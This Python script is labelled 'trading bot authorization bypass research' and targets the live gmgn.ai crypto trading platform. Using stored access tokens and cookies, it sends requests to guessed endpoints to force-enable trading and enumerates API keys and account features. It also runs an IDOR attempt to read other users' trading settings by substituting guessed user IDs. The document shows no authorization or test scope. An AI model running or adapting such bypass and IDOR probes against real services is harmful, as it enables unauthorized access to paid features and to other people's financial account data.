#!/usr/bin/env python3
"""
Trading Bot Authorization Bypass Research
Error 40101600: GMGN_TRADE_UNAUTHORIZED

This script tests different methods to bypass trading bot auth.
"""
import json
import requests
from datetime import datetime

# Load tokens and cookies
with open("tokens.json") as f:
    tokens = json.load(f)
    
with open("cookies.json") as f:
    COOKIES = json.load(f)

ACCESS_TOKEN = tokens["access_token"]
REFRESH_TOKEN = tokens["refresh_token"]

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

PARAMS = {
    "device_id": "acf898c7-5063-4d0f-b992-d1e5d568409e",
    "fp_did": "5154d56b50e3061629dca8bf8538b346",
    "client_id": "gmgn_web_20260712-1986-3641f8b",
    "from_app": "gmgn",
    "app_ver": "20260712-1986-3641f8b",
    "tz_name": "Asia/Aden",
    "tz_offset": "10800",
    "app_lang": "en-US",
    "os": "web",
    "worker": "0"
}

print("="*80)
print("🔥 TRADING BOT AUTHORIZATION BYPASS RESEARCH")
print("="*80)
print(f"Error code: 40101600 - GMGN_TRADE_UNAUTHORIZED")
print(f"Goal: Find what auth is required for trading bot access")
print("="*80)

# STEP 1: Check trading bot settings
print("\n[1] CHECK: Get trading bot settings")
endpoints = [
    "/api/v1/trade/smart/setting/get",
    "/api/v1/trade/setting/get",
    "/xapi/v1/trade/smart/setting",
    "/account/trade/settings",
]

for endpoint in endpoints:
    print(f"\n   Testing: {endpoint}")
    try:
        r = requests.post(
            f"https://gmgn.ai{endpoint}",
            params=PARAMS,
            headers=HEADERS,
            cookies=COOKIES,
            json={},
            timeout=10
        )
        print(f"   Status: {r.status_code}")
        if r.status_code == 200:
            d = r.json()
            print(f"   ✅ SUCCESS!")
            print(f"   {json.dumps(d, indent=2)[:500]}")
            if d.get("code") == 0:
                break
        else:
            print(f"   Error: {r.text[:200]}")
    except Exception as e:
        print(f"   Error: {e}")

# STEP 2: Check wallet binding
print("\n[2] CHECK: Are wallets authorized for trading?")
try:
    r = requests.post(
        "https://gmgn.ai/account/wallet/list",
        params=PARAMS,
        headers=HEADERS,
        cookies=COOKIES,
        json={},
        timeout=10
    )
    print(f"Status: {r.status_code}")
    if r.status_code == 200:
        d = r.json()
        print(f"Response: {json.dumps(d, indent=2)[:500]}")
        if d.get("data", {}).get("wallet_list"):
            print("\n✅ Found wallets:")
            for w in d["data"]["wallet_list"]:
                print(f"   • {w.get('address')} - {w.get('chain')}")
                print(f"     Status: {w.get('status')}")
                print(f"     Type: {w.get('wallet_type')}")
    else:
        print(f"Response: {r.text[:300]}")
except Exception as e:
    print(f"Error: {e}")

# STEP 3: Try to authorize wallet for trading
print("\n[3] BYPASS: Try to authorize trading bot")
payloads = [
    {"enable_trade": True},
    {"trade_enabled": True},
    {"authorize": True},
    {"wallet_address": "0x10ED43C718714eb63d5aA57B78B54704E256024E"},
]

endpoints = [
    "/api/v1/trade/authorize",
    "/api/v1/trade/enable",
    "/account/trade/authorize",
    "/xapi/v1/trade/authorize",
]

for endpoint in endpoints:
    for payload in payloads:
        print(f"\n   Testing: {endpoint} with {payload}")
        try:
            r = requests.post(
                f"https://gmgn.ai{endpoint}",
                params=PARAMS,
                headers=HEADERS,
                cookies=COOKIES,
                json=payload,
                timeout=10
            )
            print(f"   Status: {r.status_code}")
            if r.status_code == 200:
                d = r.json()
                if d.get("code") == 0:
                    print(f"   ✅ AUTHORIZATION SUCCESS!")
                    print(f"   {json.dumps(d, indent=2)}")
                    break
                else:
                    print(f"   Code: {d.get('code')} - {d.get('message')}")
            else:
                print(f"   Error: {r.text[:150]}")
        except Exception as e:
            print(f"   Error: {e}")

# STEP 4: Check API key requirement
print("\n[4] CHECK: Does trading require API key?")
try:
    r = requests.get(
        "https://gmgn.ai/api/v1/openapi/keys",
        params=PARAMS,
        headers=HEADERS,
        cookies=COOKIES,
        timeout=10
    )
    print(f"Status: {r.status_code}")
    if r.status_code == 200:
        d = r.json()
        print(f"Response: {json.dumps(d, indent=2)}")
        if d.get("data", {}).get("keys"):
            print("\n✅ Found API keys:")
            for k in d["data"]["keys"]:
                print(f"   • Key: {k.get('key')}")
                print(f"     Permissions: {k.get('permissions')}")
    else:
        print(f"Response: {r.text[:300]}")
except Exception as e:
    print(f"Error: {e}")

# STEP 5: Check subscription status
print("\n[5] CHECK: Is trading bot a paid feature?")
try:
    r = requests.post(
        "https://gmgn.ai/account/user_info",
        params=PARAMS,
        headers=HEADERS,
        cookies=COOKIES,
        json={},
        timeout=10
    )
    print(f"Status: {r.status_code}")
    if r.status_code == 200:
        d = r.json()
        print(f"User data: {json.dumps(d, indent=2)[:800]}")
        if d.get("data"):
            user = d["data"]
            print("\n📊 Account status:")
            print(f"   • VIP Level: {user.get('vip_level', 0)}")
            print(f"   • Subscription: {user.get('subscription_type', 'none')}")
            print(f"   • Trade enabled: {user.get('trade_enabled', False)}")
            print(f"   • Features: {user.get('features', [])}")
    else:
        print(f"Response: {r.text[:300]}")
except Exception as e:
    print(f"Error: {e}")

# STEP 6: Try to get trading history (your own)
print("\n[6] CHECK: Can we access trading history?")
try:
    r = requests.get(
        "https://gmgn.ai/api/v1/trade/smart/history",
        params={**PARAMS, "limit": "10"},
        headers=HEADERS,
        cookies=COOKIES,
        timeout=10
    )
    print(f"Status: {r.status_code}")
    if r.status_code == 200:
        d = r.json()
        print(f"Response: {json.dumps(d, indent=2)[:500]}")
    else:
        print(f"Response: {r.text[:300]}")
except Exception as e:
    print(f"Error: {e}")

# STEP 7: Test IDOR - try to access another user's trading config
print("\n[7] IDOR: Try to read another user's trading settings")
test_user_ids = [
    "00000000-0000-0000-0000-000000000000",
    "ffffffff-ffff-ffff-ffff-ffffffffffff",
    "11111111-1111-1111-1111-111111111111",
]

for user_id in test_user_ids:
    print(f"\n   Testing user_id: {user_id}")
    try:
        r = requests.post(
            "https://gmgn.ai/api/v1/trade/smart/setting/get",
            params=PARAMS,
            headers=HEADERS,
            cookies=COOKIES,
            json={"user_id": user_id},
            timeout=10
        )
        print(f"   Status: {r.status_code}")
        if r.status_code == 200:
            d = r.json()
            if d.get("code") == 0:
                print(f"   💀 IDOR SUCCESS! Got settings for {user_id}")
                print(f"   {json.dumps(d, indent=2)[:500]}")
                break
            else:
                print(f"   Code: {d.get('code')} - {d.get('message')}")
        else:
            print(f"   Error: {r.text[:150]}")
    except Exception as e:
        print(f"   Error: {e}")

print("\n" + "="*80)
print("ANALYSIS COMPLETE")
print("="*80)
print("\n💡 NEXT STEPS:")
print("1. Check if you need to enable trading bot in UI first")
print("2. Check if trading requires KYC/verification")
print("3. Try with a different wallet address")
print("4. Check if 40101600 means 'feature not enabled' vs 'unauthorized'")
print("5. Sniff the actual browser requests when trading bot IS working")
